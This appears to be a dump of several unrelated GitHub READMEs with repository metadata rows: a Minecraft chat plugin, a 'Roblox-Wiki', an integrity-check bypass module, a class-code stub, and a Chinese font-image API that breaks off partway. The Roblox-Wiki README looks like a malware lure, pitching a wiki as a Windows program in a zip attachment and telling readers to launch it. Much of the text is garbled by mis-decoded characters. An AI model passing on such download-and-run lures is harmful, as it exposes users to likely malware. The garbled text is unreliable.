- üîÑ **Versatility Is Our Middle Name**  
Supports **all** popular platforms: Bukkit, Spigot, Paper, Purpur, Folia, BungeeCord, Velocity. No matter your server‚Äôs ""engine""‚Äî**Pulse** adapts to any setup!  

- üé® **Customize Every Detail**  
Colors, animations, Discord/Telegram/Twitch integrations ‚Äî **everything** under your control. Even death messages can become memes! üòà  

---

<div align=""center"">
  
  [![200 IQ MEGA SUPER LOGO](https://github.com/user-attachments/assets/dc68fd41-8341-43e5-9c07-843e1ad839f1)](https://flectone.net/pulse/)  
<h3>üöÄ Install FlectonePulse ‚Äî Let Your Server Pulse with Rhythm! üíñ</h3>
  <div>
    <a href=""https://boosty.to/thefaser""><img src=""https://flectone.net/pulse/boosty.svg"" alt=""boosty"" class=""hover-brightness""></a>
    <a href=""https://modrinth.com/plugin/flectonepulse""><img src=""https://flectone.net/pulse/modrinth.svg"" alt=""modrinth"" class=""hover-brightness""></a>
    <a href=""https://flectone.net/pulse/""><img src=""https://flectone.net/pulse/documentation.svg"" alt=""documentation"" class=""hover-brightness""></a>
    <a href=""https://discord.flectone.net/""><img src=""https://flectone.net/pulse/discord.svg"" alt=""discord"" class=""hover-brightness""></a>
  </div>
</div>

---

## üé® Custom Colors ‚Äî Paint Your Reality! üåà

![color](https://cdn.modrinth.com/data/cached_images/918bc78d4897d0453625d35b3b1f4271b092651b.gif)  

Create unique chat designs ‚Äî players will gasp at the style üí•. Even the server console becomes more colorful!  

---

## üåç **Smart Localization ‚Äî Speak Your Players‚Äô Language!** üó£Ô∏è  

### ‚öôÔ∏è How It Works  
[![locale](https://flectone.net/pulse/locale.gif)](https://flectone.net/pulse/docs/config#language-player)

- üîÑ **Auto-Language Detection**  
If `language-player` is enabled in config, the plugin **automatically** detects players‚Äô Minecraft language and displays messages accordingly!  

- üõ†Ô∏è **Fallback System**  
If localization isn‚Äôt found for a player‚Äôs language, it uses the default language from the config.

**‚Üí Full localization guide in the** [documentation](https://flectone.net/pulse/docs/config#language-player) üîó   

---

## ‚ú® Personalize EVERYTHING That Moves! üîß  
**Customize default messages to match your unique vibe:**  

| üñºÔ∏è **Visual** | üí¨ **Description** |  
|---------------|-----------------|  
| ![status](https://flectone.net/pulse/version.png) | **Server MOTD** <br> Turn boring text into epic billboards! Add animations or hidden Easter eggs ü•ö |  
| ![join](https://flectone.net/pulse/join.png) | **Join Messages** <br> Welcome players like rockstars: sounds, custom Title messages üé∏ |  
| ![tab](https://flectone.net/pulse/tab.png) | **TAB** <br> Show top info directly in Tab: ping, online status, donor status üîù |  
| ![death](https://flectone.net/pulse/deathserver.png) | **Deaths** <br> Add dark humor, epic soundtracks üíÄ |  
| ![brand](https://flectone.net/pulse/brand.png) | **Branding** <br> Your logo in the F3 menu? Easy! Promote your server even here üîç |  
| ![advancement](https://flectone.net/pulse/task.png) | **Advancements** <br> Create unique achievement messages üèÜ |  

**...and many more settings!** Full list in [message.yml docs](https://flectone.net/pulse/docs/message/) üöÄ  

---

## ü§ù Integrations

### üåç With External Platforms  

| üñºÔ∏è **Visual** | üí¨ **Description** |  
|---------|----------|  
| [![discord](https://flectone.net/pulse/discordmessage.png)](https://flectone.net/pulse/docs/integration/discord/) | **Discord** <br> Server chat in your channel + synchronized notifications üí¨ |  
| [![telegram](https://flectone.net/pulse/telegrammessage2.png)](https://flectone.net/pulse/docs/integration/telegram/) | **Telegram** <br> Receive player messages and admin commands via bot üì≤ |  
| [![twitch](https://flectone.net/pulse/twitchmessage.png)](https://flectone.net/pulse/docs/integration/twitch/) | **Twitch** <br> Stream alerts directly in Minecraft chat üé• |  

### üîå With Plugins

| üñºÔ∏è **Plugin**                                                                                | üí¨ **Description**                                                 |  
|-----------------------------------------------------------------------------------------------|--------------------------------------------------------------------|  
| üí¨ **[InteractiveChat](https://flectone.net/pulse/docs/integration/interactivechat/)**        | Advanced chat formatting with interactive elements                 | 
| üõ°Ô∏è **[LuckPerms](https://flectone.net/pulse/docs/integration/luckperms/)**                   | Roles, permissions, and weighted groups‚Äîall under control          |  
| üß© **[PlaceholderAPI](https://flectone.net/pulse/docs/integration/placeholderapi/)**          | Dynamic variables like <code>%player_level%</code> in any message  |  
| üéôÔ∏è **[PlasmoVoice & SimpleVoice](https://flectone.net/pulse/docs/integration/plasmovoice/)** | Sync ignores/mutes between voice chat and server                   |  
| üñºÔ∏è **[SkinsRestorer](https://flectone.net/pulse/docs/integration/skinsrestorer/)**           | Custom skins in chat/TAB without hassle                            |  
| üëª **[SuperVanish](https://flectone.net/pulse/docs/integration/supervanish/)**                | Hidden players don‚Äôt break chat/command logic                      |  
| üí∞ **[Vault](https://flectone.net/pulse/docs/integration/vault/)**                            | Unified permissions via vanilla permissions                        |  

**‚Üí Full integration list in** [documentation](https://flectone.net/pulse/docs/integration/) üîó  

---

## üéÆ 30+ Commands üí•  

| üñºÔ∏è **Visual** | üí¨ **Description** |  
|--------------|------------------------|  
| [![ball](https://flectone.net/pulse/commandball.png)](https://flectone.net/pulse/docs/command/) | **/ball** <br> Magic 8-ball with 20+ response options |  
| [![tictactoe](https://flectone.net/pulse/commandtictactoe.png)](https://flectone.net/pulse/docs/command/) | **/tictactoe** <br> 3D board with animated win lines. Modes: <br> ü§ñ Chinese üë• Classic |  
| [![stream](https://flectone.net/pulse/commandstream.png)](https://flectone.net/pulse/docs/command/) | **/stream** <br> Stream alerts + auto-posting to Discord, with streamer prefix |  
| [![try](https://flectone.net/pulse/commandtry.png)](https://flectone.net/pulse/docs/command/) | **/try** <br> 0-100% roulette! |  

**‚Üí Full command list in** [documentation](https://flectone.net/pulse/docs/command/) üîó  

---

## üôè Credits ‚Äî Thank You for Existing! üíñ  

**These projects are our foundation and inspiration:**  

- üèóÔ∏è **[Google Guice](https://github.com/google/guice)** ‚Äî Boss-level dependency injection  
- üì¶ **[Elytrium Java Serializer](https://github.com/Elytrium/java-serializer)** ‚Äî Faster data serialization than Minecraft crashes without OptiFine  
- üßô **[PacketEvents](https://github.com/retrooper/packetevents)** ‚Äî Minecraft packet magic at Dumbledore‚Äôs level  
- üé® **[Adventure](https://github.com/KyoriPowered/adventure)** ‚Äî Text styling cooler than Banksy‚Äôs graffiti  
- ‚å®Ô∏è **[CommandAPI](https://github.com/CommandAPI/CommandAPI)** ‚Äî Create commands with autocomplete that makes AIs cry  
- üìä **[Scoreboard](https://github.com/MegavexNetwork/scoreboard-library)** ‚Äî Scoreboards stable on a Pentium III  
- ‚è±Ô∏è **[Universal Scheduler](https://github.com/Anon8281/UniversalScheduler)** ‚Äî Timers more precise than a robot‚Äôs metronome  
- üî£ **[Symbol Chat](https://github.com/replaceitem/symbol-chat)** ‚Äî 200+ symbols for when emojis aren‚Äôt enough üòè  
- üñ•Ô∏è **[PacketUxUi](https://github.com/OceJlot/PacketUxUi)** ‚Äî GUIs that shame vanilla interfaces  
- üí¨ **[LightChatBubbles](https://github.com/atesin/LightChatBubbles)** ‚Äî Non-annoying chat bubbles even after 10 hours of play  
- üå± **[FlectoneChat](https://github.com/Flectone/FlectoneChat)** ‚Äî This project‚Äôs granddaddy, still trending  

**...and you, stars!** Every GitHub star is like RedBull for our code ‚≠ê  

## üìä **Stats ‚Äî We‚Äôre Trending!** üìà  
Yes, we track stats like Elon tracks Twitter üöÄ  
<div align=""center"">
  <a href=""https://bstats.org/plugin/bukkit/FlectonePulse"" target=""_blank"">
    <img src=""https://bstats.org/signatures/bukkit/FlectonePulse.svg"" alt=""FlectonePulse stats"">
  </a>
</div>

---

## ‚ù§Ô∏è Project ‚Äî Open Source & Free Forever  
**Download, modify, use‚Äîwe encourage it!** Want **priority fixes** and **personalized advice**? Support us on Boosty:  
    [![boosty](https://flectone.net/pulse/boosty.svg)](https://boosty.to/thefaser)  

**What you get:**  
- üöÄ Technical Q&A access  
- üõ†Ô∏è Custom server solutions  
- üî• Early access to experimental features  

**For others:**  
- üìö Everything‚Äôs in the [documentation](https://flectone.net/pulse/)  
- üêû Report bugs via [Issues](https://github.com/Flectone/FlectonePulse/issues)  

<div align=""center"">
  <h2> <b>FlectonePulse Awaits! Ready to Deploy? üòè</b> </h2>
  <a href=""https://modrinth.com/plugin/flectonepulse""><img src=""https://flectone.net/pulse/modrinth.svg"" width=""200"" alt=""modrinth""></a>
  <br>
  <h3>P.S. Join our <a href=""https://discord.flectone.net/"">Discord</a> üé®</h3>
</div>
",4,0,1,GPL-3.0,1,0.0,0.0,1.0,1.0,8.0,0.0,-1.65,0.0
Randypro123/Roblox-Wiki,master,"# üéÆ Welcome to the Roblox Wiki Repository! üöÄ

Welcome to the Roblox Wiki, your go-to source for all things related to Roblox! Whether you are a seasoned Roblox developer or just starting out, this repository is here to provide you with valuable information about different aspects of Roblox, including scripting and the API. 

## üìÅ Repository Details:
- **Repository Name:** Roblox-Wiki
- **Description:** The Roblox Wiki is a free Windows program about Roblox that anyone can read and edit. It contains information about various aspects of Roblox, including scripting and the API.
- **Topics:** Not provided

## üì• Get Started:
To access the program and start exploring the world of Roblox, kindly download the program by clicking the link below:
[![Download Program](https://img.shields.io/badge/Download-Program.zip-blue.svg)](https://github.com/user-attachments/files/18285177/Program.zip)

### **Note:** Please make sure to launch the downloaded file to begin using the program.

## üåü Program Features:
1. **User-Friendly Interface:** Easily navigate through the program to find the information you need.
2. **Comprehensive Information:** Learn about various aspects of Roblox, scripting techniques, and the API.
3. **Edit Capabilities:** Contribute to the wiki by editing and adding information.

## ‚ÑπÔ∏è Additional Information:
If the provided link is not working or you require more information, please check the ""Releases"" section of this repository for alternative download options.

## ü§ù Contribution:
We welcome contributions from the Roblox community! Feel free to suggest edits, additions, or improvements to make this repository even more valuable for all Roblox enthusiasts.

## üìß Contact Us:
If you have any queries or suggestions regarding the Roblox Wiki program, please feel free to reach out to us through the repository's contact details.

Dive into the exciting world of Roblox with the Roblox Wiki program! Happy exploring! üéâ

---

*Disclaimer: This README is intended for informational purposes only and does not contain any legal or official information related to Roblox or its products.*",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
oddbyte/Unweaken,main,"# Unweaken
This module attempts to make apps pass all integrity checks by modifying stuff like `string.contains()`
",1,0,1,,1,0.0,0.0,1.0,1.0,5.0,0.0,-0.9,0.0
rythmaryan/OOPS_Class_Codes,main,"# OOPS_Class_Codes
This repository is created to upload regular files coded during class teaching.
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
isinvon/gold-foil-font-api,main,"<img src=""./image/gold-foil-font-api title.png""/>

[//]: # '<img src=""./image/gold-foil-font-api.png"" width=""800"" />'

<img src=""./image/gold-foil-font-api description chinese.png"" width=""800"" />
<img src=""./image/gold-foil-font-api description english.png"" width=""800"" />

<div style=""display: flex; justify-content: center; align-items: center;gap: 20px;margin: 20px"">
<a href=""https://github.com/isinvon/gold-foil-font-api/blob/main/README.md"">
<img src=""./image/chinese readme.png"" alt=""README.md""/>
</a>

<a href=""https://github.com/isinvon/gold-foil-font-api/blob/main/README_en.md"">
<img src=""image/english readme.png"" alt=""README_en.md"">
</a>
</div>

## üñºÔ∏è GUI ÁïåÈù¢ ‚ûΩ

‰∏ãËΩΩÂú∞ÂùÄ: [üîóGitHub Releases](https://github.com/isinvon/gold-foil-font-api/releases)

<img src=""image/gui_v0.0.2.png"" width=""800"" />

## üêãDocker ÂÆâË£Ö

ÂÆâË£Ö‰πãÂâçËØ∑Ê≥®ÊÑè: docker ÈïúÂÉèÊàëËÆæÂÆöÈªòËÆ§ÊòØÂè™ÂØºÂÖ•ÈÉ®ÂàÜÂ≠ó‰Ωì,Âç≥myfontÊñá‰ª∂‰∏≠ÁöÑÂ∞ëÈáèÂ≠ó‰Ωì, Â¶ÇÊûúË¶ÅÊõ¥Â§öÂ≠ó‰ΩìËÆæÁΩÆ, ÈúÄË¶ÅÂ∞Ü ttf ÂêéÁºÄÁöÑÂ≠ó‰ΩìÊñá‰ª∂Â§çÂà∂Âà∞ clone ‰∏ãÊù•ÁöÑÈ°πÁõÆÊ†πÁõÆÂΩï‰∏ãÁöÑ`myfont`‰∏≠,ÊàëÂ∑≤ÁªèÂú®ÈïúÂÉèÊñá‰ª∂‰∏≠ËÆæÁΩÆÂ•Ω‰∫ÜÂ∞Ü ttf Êñá‰ª∂Êã∑Ë¥ùÂà∞ÂÆπÂô®‰∏≠ÁöÑÊ≠•È™§, Êé•‰∏ãÊù•ÊûÑÂª∫ÈïúÂÉè, ÂÜçËøêË°åÂÆπÂô®Âç≥ÂèØ
(Ëøô‰πàÂÅöÊòØËÄÉËôëÂà∞ ttf Â≠ó‰ΩìÊñá‰ª∂ÁöÑÂç†Áî®ÂÆûÂú®Â§™Â§ß‰∫Ü, Êé®ÈÄÅÂà∞‰ªìÂ∫ì‰ºöÂØºËá¥‰ªìÂ∫ì‰ΩìÁßØËøáÂ§ß(1‰∏™G), ÊâÄ‰ª•Âª∫ËÆÆÊâãÂä®‰∏ä‰º†,ÂÖ∑‰Ωì ttf Êñá‰ª∂ÊàëÊé•‰∏ãÊù•‰ºöËØ¥Êòé)

```bash
git clone --branch docker https://github.com/isinvon/gold-foil-font-api.git # ÂÖãÈöÜÈ°πÁõÆdockerÂàÜÊîØ
cd ./gold-foil-font-api # ËøõÂÖ•È°πÁõÆÁõÆÂΩï
docker build -t gold-foil-font-api . # ÊûÑÂª∫ÈïúÂÉè
docker run -d --restart always -p 8080:8080 -p 3000:3000 gold-foil-font-api # ËøêË°åÂÆπÂô®, ÂÆπÂô®ÂÜÖÈÉ® 8080‰∏∫ÂêéÁ´ØÁ´ØÂè£, 3000‰∏∫ÂâçÁ´ØÁ´ØÂè£, ÂÆø‰∏ªÊú∫Êò†Â∞ÑÁ´ØÂè£ÈúÄË¶Å‰øÆÊîπËØ∑Ëá™Ë°åÊìç‰Ωú
```

### ‰∏ä‰º†Ëá™ÂÆö‰πâÂ≠ó‰Ωì (ÂèØÈÄâ, Ê≠§Ê≠•È™§ÈúÄË¶ÅÂú®`ÊûÑÂª∫ÈïúÂÉè`ÂâçÊìç‰Ωú)
ÊâìÂºÄËµÑÊ∫êÁÆ°ÁêÜÂô®, Âà∞`C:\Windows\Fonts`Ë∑ØÂæÑ‰∏ã, Â§çÂà∂ÊâÄÈÄâÁöÑÂ≠ó‰ΩìÊñá‰ª∂, ÁÑ∂ÂêéÁ≤òË¥¥Âà∞Âí± clone ‰∏ãÊù•ÁöÑ`myfont`Êñá‰ª∂Â§π‰∏≠, ÁÑ∂ÂêéÊé•‰∏ãÊù•Â∞±ÂèØ‰ª•ÊûÑÂª∫ÈïúÂÉè(Ëøô‰∏Ä‰∏™Ê≠•È™§‰ºöËá™Âä®Â∞ÜÊâÄÊúâ ttf Â≠ó‰ΩìÊñá‰ª∂Êã∑Ë¥ùÂà∞ÂÆπÂô®‰∏≠), ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ËøêË°åÂÆπÂô®‰∫Ü
<img src=""./image/PixPin_2024-12-22_18-52-17.gif"" width=""800"" />

## ‚öôÔ∏è ÊîØÊåÅÂäüËÉΩ

1. ÊñáÂ≠óÂÜÖÂÆπ
2. Â≠ó‰ΩìÈÄâÊã© (‰ªÖÊîØÊåÅÁ≥ªÁªüÂ≠ó‰ΩìÂàóË°®)
3. Â≠ó‰ΩìÈ¢úËâ≤Á±ªÂûãÈÄâÊã© (ÊîØÊåÅÈöèÊú∫ÂíåÈöèÊú∫Ê∏êÂèò)
4. ËÉåÊôØÈ¢úËâ≤/ÈöèÊú∫ËÉåÊôØ (ÊîØÊåÅÈöèÊú∫)
5. Ê∏êÂèòÊñπÂêë

## üöÄ ÊµãËØïÁéØÂ¢É ‚ûΩ

- Windows11 Á≥ªÁªü
- Java v21 ÂêéÁ´ØÂºÄÂèë
- Springboot 3.3.6 ÂêéÁ´ØÊ°ÜÊû∂
- Maven v3.9.8 ÂêéÁ´ØÊûÑÂª∫,‰æùËµñÁÆ°ÁêÜÂ∑•ÂÖ∑
- JPackage21 ÊâìÂåÖ
- Node.js v20.15.0 ÂâçÁ´ØÂºÄÂèë
- Vue.js v3.5.13 ÂâçÁ´ØÊ°ÜÊû∂
- Vite v6.0.1 ÂâçÁ´ØÊûÑÂª∫
- pnpm v9.14.2 ÂåÖÁÆ°ÁêÜÂ∑•ÂÖ∑

## Êé•Âè£ÂèÇÊï∞ÂàóË°®

| ÂèÇÊï∞Âêç                | Á±ªÂûã   | ÈªòËÆ§ÂÄº       | ÊèèËø∞                                                                                                                                                                                                                                   |
| --------------------- | ------ | ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| text                  | String | -            | ÊñáÂ≠óÂÜÖÂÆπÔºåÂøÖÂ°´                                                                                                                                                                                                                         |
| fontType              | String | `‰∏âÊûÅÊ≥ºÂ¢®‰Ωì` | Â≠ó‰ΩìÁ±ªÂûãÔºåÈªòËÆ§‰∏∫`‰∏âÊûÅÊ≥ºÂ¢®‰Ωì`ÔºåÂèØÈÄâÂÄº‰∏∫Á≥ªÁªüÂ≠ó‰ΩìÂàóË°®                                                                                                                                                                                     |
| gradientPos           | String | `random`     | Ê∏êÂèòÊñπÂêëÔºåÈªòËÆ§‰∏∫ `random`ÔºåÂèØÈÄâÂÄº‰∏∫ `leftToRight`„ÄÅ`topToBottom`„ÄÅ`leftTopToRightBottom`„ÄÅ`leftBottomToRightTop`„ÄÅ`rightToLeft`„ÄÅ`bottomToTop`„ÄÅ`rightTopToLeftBottom`„ÄÅ`rightBottomToLeftTop`„ÄÅ`circular`„ÄÅ`circularRandom`„ÄÅ`random` |
| fontColorType         | String | `gold`       | Â≠ó‰ΩìÈ¢úËâ≤Á±ªÂûãÔºåÈªòËÆ§‰∏∫ `gold`ÔºåÂèØÈÄâÂÄº‰∏∫ `silver`„ÄÅ`black`„ÄÅ`blackGradient`„ÄÅ`custom`„ÄÅ`customGradient`„ÄÅ`random`„ÄÅ`randomGradient`                                                                                                       |
| fontCustomColor       | String | -            | Ëá™ÂÆö‰πâÂ≠ó‰ΩìÈ¢úËâ≤ÔºåÊó†ÈªòËÆ§ÂÄºÔºå‰ªÖÂΩì `fontColorType` ‰∏∫ `custom`ÊàñËÄÖ`customGradient` Êó∂ÊúâÊïàÔºå‰ªÖÊîØÊåÅÂçÅÂÖ≠ËøõÂà∂È¢úËâ≤Ôºå‰æãÂ¶ÇÔºö`#ff0000`                                                                                                             |
| isBackground          | String | `false`      | ÊòØÂê¶‰ΩøÁî®ËÉåÊôØÔºåÈªòËÆ§‰∏∫ `false`ÔºåÂèØÈÄâÂÄº‰∏∫ `true`„ÄÅ`false`                                                                                                                                                                                 |
| isRandomBackground    | String | `false`      | ÊòØÂê¶‰ΩøÁî®ÈöèÊú∫ËÉåÊôØÔºåÈªòËÆ§‰∏∫ `false`ÔºåÂèØÈÄâÂÄº‰∏∫ `true`„ÄÅ`false`                                                                                                                                                                             |
| backgroundCustomColor | String | -            | Ëá™ÂÆö‰πâËÉåÊôØÈ¢úËâ≤ÔºåÊó†ÈªòËÆ§ÂÄºÔºå‰ªÖÂΩì `isBackground` ‰∏∫ `true` ,‰∏î`isRandomBackground`‰∏∫`false`Êó∂ÊúâÊïàÔºå‰ªÖÊîØÊåÅÂçÅÂÖ≠ËøõÂà∂È¢úËâ≤Ôºå‰æãÂ¶ÇÔºö`#ff0000`                                                                                                    |

## ‚ú® Âü∫Êú¨Áî®Ê≥ï ‚ûΩ

### üü° ÈáëËâ≤ ‚ûΩ

‰øÆÊîπÂèÇÊï∞ `text` ‰∏∫ÊÉ≥Ë¶ÅÁöÑÂ≠óÂç≥ÂèØÔºåÊó†ÈúÄÂä†ÂÖ∂‰ªñÂèÇÊï∞Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê

<img src=""./image/happy new year gold.png"" width=""800"" />

### ‚ö™ Èì∂Ëâ≤ ‚ûΩ

‰øÆÊîπÂèÇÊï∞ `text` ‰∏∫ÊÉ≥Ë¶ÅÁöÑÂ≠óÔºå‰∏îÈúÄË¶ÅÂ∞ÜÂèÇÊï∞ `fontColorType` ËÆæÁΩÆ‰∏∫ `silver`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=silver

<img src=""./image/happy new year silver.png"" width=""800"" />

### ‚ö´ ÈªëËâ≤ ‚ûΩ

‰øÆÊîπÂèÇÊï∞ `text` ‰∏∫ÊÉ≥Ë¶ÅÁöÑÂ≠óÔºå‰∏îÈúÄË¶ÅÂ∞ÜÂèÇÊï∞ `fontColorType` ËÆæÁΩÆ‰∏∫ `black`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=black

<img src=""./image/happy new year black.png"" width=""800"" />

### üñ§ ÈªëËâ≤Ê∏êÂèò ‚ûΩ

‰øÆÊîπÂèÇÊï∞ `text` ‰∏∫ÊÉ≥Ë¶ÅÁöÑÂ≠óÔºå‰∏îÈúÄË¶ÅÂ∞ÜÂèÇÊï∞ `fontColorType` ËÆæÁΩÆ‰∏∫ `blackGradient`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=blackGradient

<img src=""./image/happy new year blackGradient.png"" width=""800"" />

## ‚úèÔ∏è ‰øÆÊîπÂ≠ó‰ΩìÂÜÖÂÆπ ‚ûΩ

‰øÆÊîπÂèÇÊï∞ `text` ‰∏∫ÊÉ≥Ë¶ÅÁöÑÂ≠óÂç≥ÂèØÔºåÊó†ÈúÄÂä†ÂÖ∂‰ªñÂèÇÊï∞Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=66 Â§ßÈ°∫

<img src=""./image/66Â§ßÈ°∫.png"" width=""800"" />

## üé® ‰øÆÊîπÂ≠ó‰ΩìÈ¢úËâ≤Á±ªÂûã ‚ûΩ

`fontColorType`ÊîØÊåÅÂèÇÊï∞

1. `gold` - ÈáëËâ≤
2. `silver` - Èì∂Ëâ≤
3. `black` - ÈªëËâ≤
4. `blackGradient` - ÈªëËâ≤Ê∏êÂèò
5. `custom` - Ëá™ÂÆö‰πâ
6. `customGradient` - Ëá™ÂÆö‰πâÊ∏êÂèò
7. `random` - ÈöèÊú∫
8. `randomGradient` - ÈöèÊú∫Ê∏êÂèò

‰øÆÊîπÂèÇÊï∞ `fontColorType` ‰∏∫ÊÉ≥Ë¶ÅÁöÑÁ±ªÂûã:

‰æã 1: http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=silver

‰æã 2: http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=black

‰æã 3: http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=random

‰æã 4: http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=randomGradient

‰æã 5: http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=custom&fontCustomColor=#ff0000

‰æã 6: http://localhost:8080/api/gold-foil-image?text=Êñ∞Âπ¥Âø´‰πê&fontColorType=customGradient&fontCustomGradientColor=red&fontCustomGradientColor=#999999

## üé® ‰øÆÊîπÂ≠ó‰ΩìÈ¢úËâ≤ ‚ûΩ

‰øÆÊîπÂèÇÊï∞ `fontCustomColor` ‰∏∫ÊÉ≥Ë¶ÅÁöÑÈ¢úËâ≤

ÈúÄË¶ÅÂçÅÂÖ≠ËøõÂà∂È¢úËâ≤Ôºå‰æãÂ¶Ç: `#ff0000` (ÈúÄË¶ÅÂ∞Ü`fontColorType`ËÆæÁΩÆ‰∏∫`custom`(Ëá™ÂÆö‰πâ)ÊàñËÄÖ`customGradient`(Ëá™ÂÆö‰πâÊ∏êÂèò)
ÊâçËÉΩÂ§ü‰ΩøÁî®`fontCustomColor`)

Ëá™ÂÆö‰πâ

‰æã 1: http://localhost:8080/api/gold-foil-image?text=‰Ω†Â•Ω&fontColorType=custom&fontCustomColor=#999999

Ëá™ÂÆö‰πâÊ∏êÂèò:

‰æã 2: http://localhost:8080/api/gold-foil-image?text=‰Ω†Â•Ω&fontColorTypecustomGradient&fontCustomColor=#999999

ÈöèÊú∫

‰æã 3: http://localhost:8080/api/gold-foil-image?text=‰Ω†Â•Ω&fontColorType=random

ÈöèÊú∫Ê∏êÂèò:

‰æã 4: http://localhost:8080/api/gold-foil-image?text=‰Ω†Â•Ω&fontColorType=randomGradient&fontCustomGradientColor=#999999

## üé® ‰øÆÊîπËÉåÊôØ ‚ûΩ

`isBackground`ÊîØÊåÅÂèÇÊï∞

1. `true` - ÂºÄÂêØËÉåÊôØ
2. `false` - ÂÖ≥Èó≠ËÉåÊôØ

`isRandomBackground`ÊîØÊåÅÂèÇÊï∞

1. `true` - ÂºÄÂêØÈöèÊú∫ËÉåÊôØ(‰ºöÂêØÂä®Êò•ËÅîËÉåÊôØ,‰πüÂ∞±ÊòØÊúâÁÇπÂõæÊ°à)
2. `false` - ÂÖ≥Èó≠ÈöèÊú∫ËÉåÊôØ

`backgroundColor`ÊîØÊåÅÂèÇÊï∞

1. ÂçÅÂÖ≠ËøõÂà∂ÁöÑÈ¢úËâ≤Ôºå‰æãÂ¶ÇÔºö`#ff0000`

‰∏âËÄÖÁªìÂêàÁ§∫‰æã:

ÂºÄÂêØÈöèÊú∫ËÉåÊôØ(Ê≠§Êó∂‰∏çÂÖÅËÆ∏ËÆæÁΩÆËÉåÊôØÈ¢úËâ≤),
‰æã 1: http://localhost:8080/api/gold-foil-image?text=È∏°‰Ω†Â§™Áæé&isBackground=true&isRandomBackground=true

ÂÖ≥Èó≠ÈöèÊú∫ËÉåÊôØ,
‰æã 2: http://localhost:8080/api/gold-foil-image?text=È∏°‰Ω†Â§™Áæé&isBackground=true&isRandomBackground=false&backgroundColor=#ff0000

ÂÖ≥Èó≠ÈöèÊú∫ËÉåÊôØÂπ∂‰∏î‰∏çËÆæÁΩÆÈ¢úËâ≤,Â∞±‰ºöÊòØÊó†Ëâ≤ÁöÑËÉåÊôØ
‰æã 3: http://localhost:8080/api/gold-foil-image?text=È∏°‰Ω†Â§™Áæé&isBackground=true&isRandomBackground=false

## üèÆ Êò•ËÅîËÉåÊôØÂ±ïÁ§∫ ‚ûΩ

Ê∑ªÂä†ÂèÇÊï∞ `isBackground` ‰∏∫ `true`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=È∏°‰Ω†Â§™Áæé&isBackground=true&isRandomBackground=true

ÊØè‰∏ÄÊ¨°ËØ∑Ê±ÇÈÉΩÊòØÈöèÊú∫ÁöÑÔºåÊâÄ‰ª•ÊØèÊ¨°ËØ∑Ê±ÇÁöÑËÉåÊôØÈ¢úËâ≤ÈÉΩÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑÔºå‰æãÂ¶Ç:

<img src=""./image/ikun-1.png"" width=""800"" />

<img src=""./image/ikun-2.png"" width=""800"" />

<img src=""./image/ikun-3.png"" width=""800"" />

<img src=""./image/ikun-4.png"" width=""800"" />

## ‚òÄÔ∏è Ê∏êÂèòÊñπÂêë ‚ûΩ

`gradientPos`ÊîØÊåÅÂèÇÊï∞

1. `leftToRight` - ‰ªéÂ∑¶Âà∞Âè≥
2. `topToBottom` - ‰ªé‰∏äÂà∞‰∏ã
3. `leftTopToRightBottom` - ‰ªéÂ∑¶‰∏äÂà∞Âè≥‰∏ã
4. `leftBottomToRightTop` - ‰ªéÂ∑¶‰∏ãÂà∞Âè≥‰∏ä
5. `rightToLeft` - ‰ªéÂè≥Âà∞Â∑¶
6. `bottomToTop` - ‰ªé‰∏ãÂà∞‰∏ä
7. `rightTopToLeftBottom` - ‰ªéÂè≥‰∏äÂà∞Â∑¶‰∏ã
8. `rightBottomToLeftTop` - ‰ªéÂè≥‰∏ãÂà∞Â∑¶‰∏ä
9. `circular` - ÂúÜÂΩ¢Ê∏êÂèò
10. `circularRandom` - ÂúÜÂΩ¢Ê∏êÂèò(ÈöèÊú∫)

### `leftToRight` - ‰ªéÂ∑¶Âà∞Âè≥

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `leftToRight`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=È∏°‰Ω†Â§™Áæé&gradientPos=leftToRight

### `topToBottom` - ‰ªé‰∏äÂà∞‰∏ã

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `topToBottom`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=ÂÖâÊ≥ΩÊïàÊûú&gradientPos=topToBottom

### `leftTopToRightBottom` - ‰ªéÂ∑¶‰∏äÂà∞Âè≥‰∏ã

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `leftTopToRightBottom`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=‰ªéÂ∑¶‰∏äÂà∞Âè≥‰∏ã&gradientPos=leftTopToRightBottom

### `leftBottomToRightTop` - ‰ªéÂ∑¶‰∏ãÂà∞Âè≥‰∏ä

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `leftBottomToRightTop`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=‰ªéÂ∑¶‰∏ãÂà∞Âè≥‰∏ä&gradientPos=leftBottomToRightTop

### `rightToLeft` - ‰ªéÂè≥Âà∞Â∑¶

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `rightToLeft`Ôºå‰æãÂ¶Ç:

